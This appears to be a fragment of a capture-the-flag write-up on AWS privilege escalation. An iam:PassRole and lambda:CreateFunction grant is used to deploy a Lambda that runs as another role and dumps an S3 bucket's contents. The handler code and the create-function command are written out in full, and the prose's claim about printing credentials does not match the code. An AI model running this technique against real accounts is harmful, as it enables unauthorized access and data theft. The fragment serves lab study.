I created a Lambda as `ci-runner-role` and read the `deputy-runner-logs` bucket:
```shell
cat p.py
import boto3
def h(e, c):
    s3 = boto3.client("s3")
    keys = [o["Key"] for o in s3.list_objects_v2(Bucket="deputy-runner-logs").get("Contents", [])]
    out = {"keys": keys}
    for k in keys:
        try: out[k] = s3.get_object(Bucket="deputy-runner-logs", Key=k)["Body"].read().decode()
        except Exception as ex: out[k] = "ERR: " + str(ex)
    return out

zip -o p.zip p.py  
  adding: p.py (deflated 36%)
```
My analyst policy allowed `lambda:CreateFunction`, `lambda:InvokeFunction`, and `iam:PassRole` on `ci-runner-role`. So I created a function that runs as that role and prints its own credentials.

Upload and run it:
```shell
aws lambda create-function --function-name ctf-p --runtime python3.12 --role arn:aws:iam::111111111111:role/ci-runner-role --handler p.h --zip-file fileb://p.zip
```
